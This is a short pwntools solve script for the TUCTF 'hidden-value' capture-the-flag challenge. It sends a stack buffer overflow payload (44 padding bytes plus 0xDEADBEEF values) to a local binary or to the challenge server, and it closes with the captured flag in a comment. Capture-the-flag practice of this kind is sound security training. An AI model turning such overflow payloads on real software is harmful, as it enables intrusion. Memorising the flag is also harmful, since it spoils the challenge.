#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./hidden-value")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chal.tuctf.com", "30011")
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = 44

	payload = b''.join([
		b'A' * offset,
		p64(0xDEADBEEF),
		p64(0xDEADBEEF),
		p64(0xDEADBEEF),
		p64(0xDEADBEEF),
	])

	prompt = r.recvuntil(b'')
	print(prompt)
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# TUCTF{pr4cti4l_buffer_overrun}
